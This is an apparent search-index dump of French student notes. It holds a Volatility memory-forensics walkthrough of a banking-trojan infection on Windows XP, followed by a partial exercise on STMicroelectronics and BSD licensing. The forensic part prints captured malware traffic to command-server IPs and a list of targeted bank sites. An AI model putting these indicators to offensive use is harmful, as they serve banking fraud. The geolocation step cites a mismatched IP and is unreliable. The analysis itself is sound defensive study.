00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x01460030 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 00 ................ 0x01460000 4d DEC EBP 0x01460001 5a POP EDX 0x01460002 90 NOP 0x01460003 0003 ADD [EBX], AL 0x01460005 0000 ADD [EAX], AL 0x01460007 000400 ADD [EAX+EAX], AL 0x0146000a 0000 ADD [EAX], AL 0x0146000c ff DB 0xff 0x0146000d ff00 INC DWORD [EAX] 0x0146000f 00b800000000 ADD [EAX+0x0], BH 0x01460015 0000 ADD [EAX], AL 0x01460017 004000 ADD [EAX+0x0], AL 0x0146001a 0000 ADD [EAX], AL 0x0146001c 0000 ADD [EAX], AL 0x0146001e 0000 ADD [EAX], AL 0x01460020 0000 ADD [EAX], AL 0x01460022 0000 ADD [EAX], AL 0x01460024 0000 ADD [EAX], AL 0x01460026 0000 ADD [EAX], AL 0x01460028 0000 ADD [EAX], AL 0x0146002a 0000 ADD [EAX], AL 0x0146002c 0000 ADD [EAX], AL 0x0146002e 0000 ADD [EAX], AL 0x01460030 0000 ADD [EAX], AL 0x01460032 0000 ADD [EAX], AL 0x01460034 0000 ADD [EAX], AL 0x01460036 0000 ADD [EAX], AL 0x01460038 0000 ADD [EAX], AL 0x0146003a 0000 ADD [EAX], AL 0x0146003c e000 LOOPNZ 0x146003e 0x0146003e 0000 ADD [EAX], AL Ce process a bien \u00e9t\u00e9 modifi\u00e9 par un autre process. malfind le sait gr\u00e2ce aux flags Flags: CommitCharge: 33, MemCommit: 1, PrivateMemory: 1, Protection: 6 Virus total Dumpons le programme douteux kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 procdump --dump-dir . -p 1484 Volatility Foundation Volatility Framework 2.6 Process(V) ImageBase Name Result ---------- ---------- -------------------- ------ 0x821dea70 0x01000000 explorer.exe OK: executable.1484.exe Envoyons le \u00e0 Virus total Yara rules FUCK commandline kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 cmdline Volatility Foundation Volatility Framework 2.6 ************************************************************************ System pid: 4 ************************************************************************ smss.exe pid: 368 Command line : \\SystemRoot\\System32\\smss.exe ************************************************************************ csrss.exe pid: 584 Command line : C:\\WINDOWS\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,3072,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ProfileControl=Off MaxRequestThreads=16 ************************************************************************ winlogon.exe pid: 608 Command line : winlogon.exe ************************************************************************ services.exe pid: 652 Command line : C:\\WINDOWS\\system32\\services.exe ************************************************************************ lsass.exe pid: 664 Command line : C:\\WINDOWS\\system32\\lsass.exe ************************************************************************ svchost.exe pid: 824 Command line : C:\\WINDOWS\\system32\\svchost -k DcomLaunch ************************************************************************ svchost.exe pid: 908 Command line : C:\\WINDOWS\\system32\\svchost -k rpcss ************************************************************************ svchost.exe pid: 1004 Command line : C:\\WINDOWS\\System32\\svchost.exe -k netsvcs ************************************************************************ svchost.exe pid: 1056 Command line : C:\\WINDOWS\\system32\\svchost.exe -k NetworkService ************************************************************************ svchost.exe pid: 1220 Command line : C:\\WINDOWS\\system32\\svchost.exe -k LocalService ************************************************************************ explorer.exe pid: 1484 Command line : C:\\WINDOWS\\Explorer.EXE ************************************************************************ spoolsv.exe pid: 1512 Command line : C:\\WINDOWS\\system32\\spoolsv.exe ************************************************************************ reader_sl.exe pid: 1640 Command line : \"C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\Reader_sl.exe\" ************************************************************************ alg.exe pid: 788 Command line : C:\\WINDOWS\\System32\\alg.exe ************************************************************************ wuauclt.exe pid: 1136 Command line : \"C:\\WINDOWS\\system32\\wuauclt.exe\" /RunStoreAsComServer Local\\[3ec]SUSDSb81eb56fa3105543beb3109274ef8ec1 ************************************************************************ wuauclt.exe pid: 1588 Command line : \"C:\\WINDOWS\\system32\\wuauclt.exe\" memdump kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 memdump --dump-dir . -p 1484 Volatility Foundation Volatility Framework 2.6 ************************************************************************ Writing explorer.exe [ 1484] to 1484.dmp grep sur 1484.dmp kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ strings 1484.dmp | grep -Fi \"41.168.5.140\" -C 10 DpI8 POST /zb/v_01_a/in/ HTTP/1.1 Accept: */* User-Agent: Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US) Host: 41.168.5.140:8080 Content-Length: 229 Connection: Keep-Alive Cache-Control: no-cache >mtvR `06! On trouve un POST sur l'IP 41.168.5.140 Dans le dump d'abode reader on retrouve le m\u00eame POST ! kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ strings 1484.dmp | grep -Fi \"/zb/v_01_a/in/\" -C 10 *BusinessAppsHome* *nab.com.au* *us.hsbc.com* *online.citibank.com/* *BalanceHome* *PassmarkChallenge* *ktt.key.com* *cm.netteller.com* */Web_Bank* *jqueryaddonsv2.js* http://188.40.0.138:8080/zb/v_01_a/in/cp.php *account.authorize.net/* <head*> <style type=\"text/css\"> body { visibility: hidden; } .ui-dialog-titlebar { display:none On d\u00e9couvre une nouvelle adresse IP : 188.40.0.138:8080 passivedns.mnemonic.no Checker les process au demarage printkey -K \"software\\Microsoft\\Windows\\Currentversion\\Run\" Registry: \\Device\\HarddiskVolume1\\Documents and Settings\\Robert\\NTUSER.DAT Key name: Run (S) Last updated: 2012-07-22 02:31:51 UTC+0000 Subkeys: Values: REG_SZ KB00207877.exe : (S) \"C:\\Documents and Settings\\Robert\\Application Data\\KB00207877.exe\" strings 1640.dmp | grep -Fi \"KB00207877.exe\" KB00207877.exe C:\\Documents and Settings\\Robert\\Application Data\\KB00207877.exe(, KB00207877.EXEn KB00207877.exe KB00207877.exe C:\\Documents and Settings\\Robert\\Application Data\\KB00207877.exe(, La conclusion qu'on pourrait en tirer c'est que l'user a t\u00e9l\u00e9charg\u00e9 un patch (la KB qui sont des mises \u00e0 jours de windows) en pensant r\u00e9gler le probl\u00e8me. Les KB ne sont pas cens\u00e9s \u00eatre au d\u00e9marrage, d\u00e8s qu'elles ont install\u00e9s elles ne sont plus actives et partent dans l'historique des KB.","title":"Forensic exercice 2 - Volatility"},{"location":"forensic/exercices/volatility/exercice2/#forensic-exercice-2-volatility","text":"","title":"Forensic exercice 2 - Volatility"},{"location":"forensic/exercices/volatility/exercice2/#by-julien-faou","text":"","title":"By Julien Faou"},{"location":"forensic/exercices/volatility/exercice2/#invetigation","text":"","title":"Invetigation"},{"location":"forensic/exercices/volatility/exercice2/#imageinfo","text":"kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (/home/kali/Documents/forensic/exercice/exo2.vmem) PAE type : PAE DTB : 0x2fe000L KDBG : 0x80545ae0L Number of Processors : 1 Image Type (Service Pack) : 3 KPCR for CPU 0 : 0xffdff000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2012-07-22 02:45:08 UTC+0000 Image local date and time : 2012-07-21 22:45:08 -0400","title":"imageinfo"},{"location":"forensic/exercices/volatility/exercice2/#connexions","text":"","title":"connexions"},{"location":"forensic/exercices/volatility/exercice2/#sockets","text":"","title":"sockets"},{"location":"forensic/exercices/volatility/exercice2/#connscan","text":"kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 connscan Volatility Foundation Volatility Framework 2.6 Offset(P) Local Address Remote Address Pid ---------- ------------------------- ------------------------- --- 0x02087620 172.16.112.128:1038 41.168.5.140:8080 1484 0x023a8008 172.16.112.128:1037 125.19.103.198:8080 1484 2 connexions d\u00e9tect\u00e9es, on note les adresses IP de destination et les PID.","title":"connscan"},{"location":"forensic/exercices/volatility/exercice2/#localisation","text":"Via le site hostip.com 45.84.52.160 Afrique du sud Gauteng Johannesburg 125.19.103.198 France Paris","title":"Localisation"},{"location":"forensic/exercices/volatility/exercice2/#pslist","text":"kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 pslist Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0x823c89c8 System 4 0 53 240 ------ 0 0x822f1020 smss.exe 368 4 3 19 ------ 0 2012-07-22 02:42:31 UTC+0000 0x822a0598 csrss.exe 584 368 9 326 0 0 2012-07-22 02:42:32 UTC+0000 0x82298700 winlogon.exe 608 368 23 519 0 0 2012-07-22 02:42:32 UTC+0000 0x81e2ab28 services.exe 652 608 16 243 0 0 2012-07-22 02:42:32 UTC+0000 0x81e2a3b8 lsass.exe 664 608 24 330 0 0 2012-07-22 02:42:32 UTC+0000 0x82311360 svchost.exe 824 652 20 194 0 0 2012-07-22 02:42:33 UTC+0000 0x81e29ab8 svchost.exe 908 652 9 226 0 0 2012-07-22 02:42:33 UTC+0000 0x823001d0 svchost.exe 1004 652 64 1118 0 0 2012-07-22 02:42:33 UTC+0000 0x821dfda0 svchost.exe 1056 652 5 60 0 0 2012-07-22 02:42:33 UTC+0000 0x82295650 svchost.exe 1220 652 15 197 0 0 2012-07-22 02:42:35 UTC+0000 0x821dea70 explorer.exe 1484 1464 17 415 0 0 2012-07-22 02:42:36 UTC+0000 0x81eb17b8 spoolsv.exe 1512 652 14 113 0 0 2012-07-22 02:42:36 UTC+0000 0x81e7bda0 reader_sl.exe 1640 1484 5 39 0 0 2012-07-22 02:42:36 UTC+0000 0x820e8da0 alg.exe 788 652 7 104 0 0 2012-07-22 02:43:01 UTC+0000 0x821fcda0 wuauclt.exe 1136 1004 8 173 0 0 2012-07-22 02:43:46 UTC+0000 0x8205bda0 wuauclt.exe 1588 1004 5 132 0 0 2012-07-22 02:44:01 UTC+0000","title":"pslist"},{"location":"forensic/exercices/volatility/exercice2/#correlation","text":"Observons le process de PID=1484, pour rappel ce dernier \u00e9tablit deux connexions vers l'afrique et la france. 0x821dea70 explorer.exe 1484 1464 17 415 0 0 2012-07-22 02:42:36 UTC+0000 explorer.exe est l'explorateur de fichier de windows, il 'nest pas cens\u00e9 utiliser internet, c'est suspect.","title":"Correlation"},{"location":"forensic/exercices/volatility/exercice2/#analyse-de-malware","text":"","title":"Analyse de malware"},{"location":"forensic/exercices/volatility/exercice2/#malfind","text":"kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 malfind -p 1484 Volatility Foundation Volatility Framework 2.6 Process: explorer.exe Pid: 1484 Address: 0x1460000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 33, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x01460000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x01460010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x01460020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x01460030 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 00 ................ 0x01460000 4d DEC EBP 0x01460001 5a POP EDX 0x01460002 90 NOP 0x01460003 0003 ADD [EBX], AL 0x01460005 0000 ADD [EAX], AL 0x01460007 000400 ADD [EAX+EAX], AL 0x0146000a 0000 ADD [EAX], AL 0x0146000c ff DB 0xff 0x0146000d ff00 INC DWORD [EAX] 0x0146000f 00b800000000 ADD [EAX+0x0], BH 0x01460015 0000 ADD [EAX], AL 0x01460017 004000 ADD [EAX+0x0], AL 0x0146001a 0000 ADD [EAX], AL 0x0146001c 0000 ADD [EAX], AL 0x0146001e 0000 ADD [EAX], AL 0x01460020 0000 ADD [EAX], AL 0x01460022 0000 ADD [EAX], AL 0x01460024 0000 ADD [EAX], AL 0x01460026 0000 ADD [EAX], AL 0x01460028 0000 ADD [EAX], AL 0x0146002a 0000 ADD [EAX], AL 0x0146002c 0000 ADD [EAX], AL 0x0146002e 0000 ADD [EAX], AL 0x01460030 0000 ADD [EAX], AL 0x01460032 0000 ADD [EAX], AL 0x01460034 0000 ADD [EAX], AL 0x01460036 0000 ADD [EAX], AL 0x01460038 0000 ADD [EAX], AL 0x0146003a 0000 ADD [EAX], AL 0x0146003c e000 LOOPNZ 0x146003e 0x0146003e 0000 ADD [EAX], AL Ce process a bien \u00e9t\u00e9 modifi\u00e9 par un autre process. malfind le sait gr\u00e2ce aux flags Flags: CommitCharge: 33, MemCommit: 1, PrivateMemory: 1, Protection: 6","title":"malfind"},{"location":"forensic/exercices/volatility/exercice2/#virus-total","text":"Dumpons le programme douteux kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 procdump --dump-dir . -p 1484 Volatility Foundation Volatility Framework 2.6 Process(V) ImageBase Name Result ---------- ---------- -------------------- ------ 0x821dea70 0x01000000 explorer.exe OK: executable.1484.exe Envoyons le \u00e0 Virus total","title":"Virus total"},{"location":"forensic/exercices/volatility/exercice2/#yara-rules","text":"FUCK","title":"Yara rules"},{"location":"forensic/exercices/volatility/exercice2/#commandline","text":"kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 cmdline Volatility Foundation Volatility Framework 2.6 ************************************************************************ System pid: 4 ************************************************************************ smss.exe pid: 368 Command line : \\SystemRoot\\System32\\smss.exe ************************************************************************ csrss.exe pid: 584 Command line : C:\\WINDOWS\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,3072,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ProfileControl=Off MaxRequestThreads=16 ************************************************************************ winlogon.exe pid: 608 Command line : winlogon.exe ************************************************************************ services.exe pid: 652 Command line : C:\\WINDOWS\\system32\\services.exe ************************************************************************ lsass.exe pid: 664 Command line : C:\\WINDOWS\\system32\\lsass.exe ************************************************************************ svchost.exe pid: 824 Command line : C:\\WINDOWS\\system32\\svchost -k DcomLaunch ************************************************************************ svchost.exe pid: 908 Command line : C:\\WINDOWS\\system32\\svchost -k rpcss ************************************************************************ svchost.exe pid: 1004 Command line : C:\\WINDOWS\\System32\\svchost.exe -k netsvcs ************************************************************************ svchost.exe pid: 1056 Command line : C:\\WINDOWS\\system32\\svchost.exe -k NetworkService ************************************************************************ svchost.exe pid: 1220 Command line : C:\\WINDOWS\\system32\\svchost.exe -k LocalService ************************************************************************ explorer.exe pid: 1484 Command line : C:\\WINDOWS\\Explorer.EXE ************************************************************************ spoolsv.exe pid: 1512 Command line : C:\\WINDOWS\\system32\\spoolsv.exe ************************************************************************ reader_sl.exe pid: 1640 Command line : \"C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\Reader_sl.exe\" ************************************************************************ alg.exe pid: 788 Command line : C:\\WINDOWS\\System32\\alg.exe ************************************************************************ wuauclt.exe pid: 1136 Command line : \"C:\\WINDOWS\\system32\\wuauclt.exe\" /RunStoreAsComServer Local\\[3ec]SUSDSb81eb56fa3105543beb3109274ef8ec1 ************************************************************************ wuauclt.exe pid: 1588 Command line : \"C:\\WINDOWS\\system32\\wuauclt.exe\"","title":"commandline"},{"location":"forensic/exercices/volatility/exercice2/#memdump","text":"kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 memdump --dump-dir . -p 1484 Volatility Foundation Volatility Framework 2.6 ************************************************************************ Writing explorer.exe [ 1484] to 1484.dmp","title":"memdump"},{"location":"forensic/exercices/volatility/exercice2/#grep-sur-1484dmp","text":"kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ strings 1484.dmp | grep -Fi \"41.168.5.140\" -C 10 DpI8 POST /zb/v_01_a/in/ HTTP/1.1 Accept: */* User-Agent: Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US) Host: 41.168.5.140:8080 Content-Length: 229 Connection: Keep-Alive Cache-Control: no-cache >mtvR `06! On trouve un POST sur l'IP 41.168.5.140 Dans le dump d'abode reader on retrouve le m\u00eame POST ! kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ strings 1484.dmp | grep -Fi \"/zb/v_01_a/in/\" -C 10 *BusinessAppsHome* *nab.com.au* *us.hsbc.com* *online.citibank.com/* *BalanceHome* *PassmarkChallenge* *ktt.key.com* *cm.netteller.com* */Web_Bank* *jqueryaddonsv2.js* http://188.40.0.138:8080/zb/v_01_a/in/cp.php *account.authorize.net/* <head*> <style type=\"text/css\"> body { visibility: hidden; } .ui-dialog-titlebar { display:none On d\u00e9couvre une nouvelle adresse IP : 188.40.0.138:8080 passivedns.mnemonic.no","title":"grep sur 1484.dmp"},{"location":"forensic/exercices/volatility/exercice2/#checker-les-process-au-demarage","text":"printkey -K \"software\\Microsoft\\Windows\\Currentversion\\Run\" Registry: \\Device\\HarddiskVolume1\\Documents and Settings\\Robert\\NTUSER.DAT Key name: Run (S) Last updated: 2012-07-22 02:31:51 UTC+0000 Subkeys: Values: REG_SZ KB00207877.exe : (S) \"C:\\Documents and Settings\\Robert\\Application Data\\KB00207877.exe\" strings 1640.dmp | grep -Fi \"KB00207877.exe\" KB00207877.exe C:\\Documents and Settings\\Robert\\Application Data\\KB00207877.exe(, KB00207877.EXEn KB00207877.exe KB00207877.exe C:\\Documents and Settings\\Robert\\Application Data\\KB00207877.exe(, La conclusion qu'on pourrait en tirer c'est que l'user a t\u00e9l\u00e9charg\u00e9 un patch (la KB qui sont des mises \u00e0 jours de windows) en pensant r\u00e9gler le probl\u00e8me. Les KB ne sont pas cens\u00e9s \u00eatre au d\u00e9marrage, d\u00e8s qu'elles ont install\u00e9s elles ne sont plus actives et partent dans l'historique des KB.","title":"Checker les process au demarage"},{"location":"management/STMicroelectronics/","text":"STMicroelectronics Pr\u00e9sentation STMicroelectronics (ST) est une soci\u00e9t\u00e9 internationale d'origine fran\u00e7aise et italienne, dont le si\u00e8ge social est en Suisse et qui d\u00e9veloppe, fabrique et commercialise des puces \u00e9lectroniques. 6\u00e8me fabricant mondial ind\u00e9pendant de semi-conducteurs, ST emploie plus de 50 000 personnes sur 17 sites de production principaux, 16 centres de recherche et d\u00e9veloppement, 39 centres de conception et d\u2019application et 88 bureaux de vente directe dans 31 pays. La compagnie poss\u00e8de un large portefeuille de produits. Elle est leader sur de nombreux march\u00e9s, notamment dans les circuits pour codeurs/d\u00e9codeurs vid\u00e9o, t\u00e9l\u00e9phones portables, applications sans fils, les p\u00e9riph\u00e9riques informatiques (pour les disques durs ou imprimantes par exemple). On retrouve ses composants dans toutes les applications \u00e9lectroniques : grand public (Hifi, TV, Vid\u00e9o), automobile (airbag, autoradio, navigateur), industrie (microcontr\u00f4leurs, r\u00e9gulateurs), informatique (gestionnaires de disques durs, d\u2019\u00e9crans), communication (t\u00e9l\u00e9phones portables) et cartes \u00e0 puce. Le site STMicroelectronics du Rousset (pr\u00e8s d\u2019Aix en Provence \u2013 Bouches du Rh\u00f4ne) occupe une place strat\u00e9gique au sein du groupe ST, avec plus de 3 000 personnes. Le syst\u00e8me d\u2019information de ST s\u2019est d\u00e9velopp\u00e9 par m\u00e9tiers, ce qui a g\u00e9n\u00e9r\u00e9 un parc applicatif tr\u00e8s complexe. Le DSI est charg\u00e9 d\u2019articuler le SI avec les orientations souhait\u00e9es par l\u2019entreprise, qui sont ax\u00e9es sur des projets innovants, en respect avec le d\u00e9veloppement durable. Vous venez d\u2019int\u00e9grer le service informatique de la soci\u00e9t\u00e9 qui est compos\u00e9 de 45 personnes. Vous allez travailler avec le responsable des syst\u00e8mes applicatifs. D\u00e9but 2014, STMicroelectronics a annonc\u00e9 la mise sur le march\u00e9, sous la r\u00e9f\u00e9rence STM32CubeTM, d\u2019un nouveau logiciel pour la configuration des puces. Disponible gratuitement, cet outil logiciel de d\u00e9veloppement simplifie et acc\u00e9l\u00e8re les projets bas\u00e9s sur les familles de puces (ou microcontr\u00f4leurs), d\u00e9velopp\u00e9s par les clients qui peuvent se concentrer pleinement sur l\u2019innovation. Ce logiciel est distribu\u00e9 sous licence BSD (Berkeley Sofware Distribution) sans restriction. Annexes A) Pr\u00e9sentation de la licence BSD La licence BSD(Berkeley Software Distribution) est une licence libre utilis\u00e9e pour la distribution de logiciels. Elle permet de r\u00e9utiliser tout ou une partie du logiciel sans restriction, qu'il soit int\u00e9gr\u00e9 dans un logiciel libre ou propri\u00e9taire.(source: Wikip\u00e9dia)La licence BSD est une licence libre, qui diff\u00e8re de la licence GNU GPL, en ce qu'elle n'est pas contaminante : toute personne peut r\u00e9utiliser le composant sans aucune restriction dans une application open source ou m\u00eame propri\u00e9taire. (D\u2019apr\u00e8s: http: wordpress.com) B) Les diff\u00e9rentes cat\u00e9gories de licences libres Au travers d\u2019une licence libre, l\u2019auteur d\u2019un logiciel peut offrir des droits plus ou moins \u00e9tendus. En plus du droit d\u2019utilisation, sont permis par d\u00e9faut la copie, la modification et la diffusion du logiciel. Pour le reste, les licences varient selon les intentions de chaque auteur de logiciel (soit le donneur de licence).Il existe trois grandes cat\u00e9gories de licences libres pour les logiciels:-Les licences domaine public. Elles sont tr\u00e8s permissives et ne comportent pas de Copyleft. Elles offrent des libert\u00e9s de copies, de modification et de diffusion sans aucune contrepartie hormis la mention du nom de l\u2019auteur du logiciel. Le cr\u00e9ateur d\u2019un logiciel d\u00e9riv\u00e9 n\u2019est donc pas contraint de rendre libre les codes source qu\u2019il a \u00e9crits et incorpor\u00e9s dans un logiciel soumis \u00e0 une licence libre de type domaine public. Ces licences sont donc largement compatibles et ne sont pas contaminantes (par exemple, la BSD ou la CeCILL-B).-Les licences copyleft(on parle aussi de licences libres strictes)Elles offrent des libert\u00e9s tr\u00e8s \u00e9tendues. Le cr\u00e9ateur met son logiciel en commun. Ainsi les autorisations de copie, de modification et de diffusion sont accord\u00e9es \u00e0 condition que chaque personne qui apporte des modifications s\u2019oblige \u00e0 en faire autant. Il s\u2019agit de constituer et enrichir un \u00abpot commun\u00bb librement accessible. Ces licences libres sont fr\u00e9quemment contaminantes. Il faut en revanche toujours contr\u00f4ler leur compatibilit\u00e9 entre elles et avec d\u2019autres licences par exemple la GNU GPL ou la CeCILL).-Les licences asym\u00e9triques(on parle aussi de licences semi-libres)Le cr\u00e9ateur choisit la licence qu\u2019il applique \u00e0 son logiciel et aux enrichissements qu\u2019il apporte lui-m\u00eame. Il oblige par ailleurs \u00e0 ce que les enrichissements effectu\u00e9s par d\u2019autres personnes soient soumis \u00e0 une licence qu\u2019il a lui-m\u00eame d\u00e9sign\u00e9e, potentiellement diff\u00e9rente de celle qu\u2019il a retenue pour ses propres d\u00e9veloppements.Ces licences permettent notamment de combiner des codes issus de logiciels propri\u00e9taires et libres. Elles tentent de trouver un point d\u2019\u00e9quilibre entre des volont\u00e9s de libert\u00e9 et des strat\u00e9gies propri\u00e9taires ou commerciales (par exemple, le GNU LGPL, la MPL ou la CeciLL-C).(Source: AEC-guide juridique logiciel libre \u2013mars 2012 Questions 1) Rappeler le cadre g\u00e9n\u00e9ral de la protection des logiciels en droit fran\u00e7ais. 2) Identifier dans le cadre de ce projet le choix de la licence d\u2019exploitation retenue pour ce logiciel. Enoncer les droits conc\u00e9d\u00e9s par STMicroelectronics aux entreprises utilisatrices de ce logiciel. Julie Leroy, salari\u00e9e de la soci\u00e9t\u00e9 STMicroelectronics, a d\u00e9velopp\u00e9 le logiciel STM32 CubeTM. Elle a d\u00e9missionn\u00e9 en vue de cr\u00e9er sa propre entreprise informatique. Elle envisage de faire \u00e9voluer le logiciel et ensuite de commercialiser la version 2. 3) Montrer que STMicroelectronics ne peut s\u2019opposer \u00e0 la modification et \u00e0 la commercialisation du logiciel par Julie Leroy. R\u00e9ponses 1) Le cadre g\u00e9n\u00e9ral de protection des logiciels et le droit d'auteur, qui implique en caract\u00e8re d'\"originalit\u00e9\" qui se traduit par une ant\u00e9riorit\u00e9 du logiciel cr\u00e9\u00e9. 2) Le choix fait par l'entreprise ST est de distribuer son logiciel par le biais d'une licence BSD qui occtoire les droits les plus \u00e9tendus \u00e0 l'utilisateur, \u00e0 savoir les 4 liberti\u00e9s fondamentales : Utiliser le logiciel Copier le logiciel Etudier modifier et distribuer les versions modifi\u00e9s du logiciel (y compris transformer l'open source en logiciel propri\u00e9taire).","title":"STMicroelectronics"},{"location":"management/STMicroelectronics/#stmicroelectronics","text":"","title":"STMicroelectronics"},{"location":"management/STMicroelectronics/#presentation","text":"STMicroelectronics (ST) est une soci\u00e9t\u00e9 internationale d'origine fran\u00e7aise et italienne, dont le si\u00e8ge social est en Suisse et qui d\u00e9veloppe, fabrique et commercialise des puces \u00e9lectroniques. 6\u00e8me fabricant mondial ind\u00e9pendant de semi-conducteurs, ST emploie plus de 50 000 personnes sur 17 sites de production principaux, 16 centres de recherche et d\u00e9veloppement, 39 centres de conception et d\u2019application et 88 bureaux de vente directe dans 31 pays. La compagnie poss\u00e8de un large portefeuille de produits. Elle est leader sur de nombreux march\u00e9s, notamment dans les circuits pour codeurs/d\u00e9codeurs vid\u00e9o, t\u00e9l\u00e9phones portables, applications sans fils, les p\u00e9riph\u00e9riques informatiques (pour les disques durs ou imprimantes par exemple). On retrouve ses composants dans toutes les applications \u00e9lectroniques : grand public (Hifi, TV, Vid\u00e9o), automobile (airbag, autoradio, navigateur), industrie (microcontr\u00f4leurs, r\u00e9gulateurs), informatique (gestionnaires de disques durs, d\u2019\u00e9crans), communication (t\u00e9l\u00e9phones portables) et cartes \u00e0 puce. Le site STMicroelectronics du Rousset (pr\u00e8s d\u2019Aix en Provence \u2013 Bouches du Rh\u00f4ne) occupe une place strat\u00e9gique au sein du groupe ST, avec plus de 3 000 personnes. Le syst\u00e8me d\u2019information de ST s\u2019est d\u00e9velopp\u00e9 par m\u00e9tiers, ce qui a g\u00e9n\u00e9r\u00e9 un parc applicatif tr\u00e8s complexe. Le DSI est charg\u00e9 d\u2019articuler le SI avec les orientations souhait\u00e9es par l\u2019entreprise, qui sont ax\u00e9es sur des projets innovants, en respect avec le d\u00e9veloppement durable. Vous venez d\u2019int\u00e9grer le service informatique de la soci\u00e9t\u00e9 qui est compos\u00e9 de 45 personnes. Vous allez travailler avec le responsable des syst\u00e8mes applicatifs. D\u00e9but 2014, STMicroelectronics a annonc\u00e9 la mise sur le march\u00e9, sous la r\u00e9f\u00e9rence STM32CubeTM, d\u2019un nouveau logiciel pour la configuration des puces. Disponible gratuitement, cet outil logiciel de d\u00e9veloppement simplifie et acc\u00e9l\u00e8re les projets bas\u00e9s sur les familles de puces (ou microcontr\u00f4leurs), d\u00e9velopp\u00e9s par les clients qui peuvent se concentrer pleinement sur l\u2019innovation. Ce logiciel est distribu\u00e9 sous licence BSD (Berkeley Sofware Distribution) sans restriction.","title":"Pr\u00e9sentation"},{"location":"management/STMicroelectronics/#annexes","text":"A) Pr\u00e9sentation de la licence BSD La licence BSD(Berkeley Software Distribution) est une licence libre utilis\u00e9e pour la distribution de logiciels. Elle permet de r\u00e9utiliser tout ou une partie du logiciel sans restriction, qu'il soit int\u00e9gr\u00e9 dans un logiciel libre ou propri\u00e9taire.(source: Wikip\u00e9dia)La licence BSD est une licence libre, qui diff\u00e8re de la licence GNU GPL, en ce qu'elle n'est pas contaminante : toute personne peut r\u00e9utiliser le composant sans aucune restriction dans une application open source ou m\u00eame propri\u00e9taire. (D\u2019apr\u00e8s: http: wordpress.com) B) Les diff\u00e9rentes cat\u00e9gories de licences libres Au travers d\u2019une licence libre, l\u2019auteur d\u2019un logiciel peut offrir des droits plus ou moins \u00e9tendus. En plus du droit d\u2019utilisation, sont permis par d\u00e9faut la copie, la modification et la diffusion du logiciel. Pour le reste, les licences varient selon les intentions de chaque auteur de logiciel (soit le donneur de licence).Il existe trois grandes cat\u00e9gories de licences libres pour les logiciels:-Les licences domaine public. Elles sont tr\u00e8s permissives et ne comportent pas de Copyleft. Elles offrent des libert\u00e9s de copies, de modification et de diffusion sans aucune contrepartie hormis la mention du nom de l\u2019auteur du logiciel. Le cr\u00e9ateur d\u2019un logiciel d\u00e9riv\u00e9 n\u2019est donc pas contraint de rendre libre les codes source qu\u2019il a \u00e9crits et incorpor\u00e9s dans un logiciel soumis \u00e0 une licence libre de type domaine public. Ces licences sont donc largement compatibles et ne sont pas contaminantes (par exemple, la BSD ou la CeCILL-B).-Les licences copyleft(on parle aussi de licences libres strictes)Elles offrent des libert\u00e9s tr\u00e8s \u00e9tendues. Le cr\u00e9ateur met son logiciel en commun. Ainsi les autorisations de copie, de modification et de diffusion sont accord\u00e9es \u00e0 condition que chaque personne qui apporte des modifications s\u2019oblige \u00e0 en faire autant. Il s\u2019agit de constituer et enrichir un \u00abpot commun\u00bb librement accessible. Ces licences libres sont fr\u00e9quemment contaminantes. Il faut en 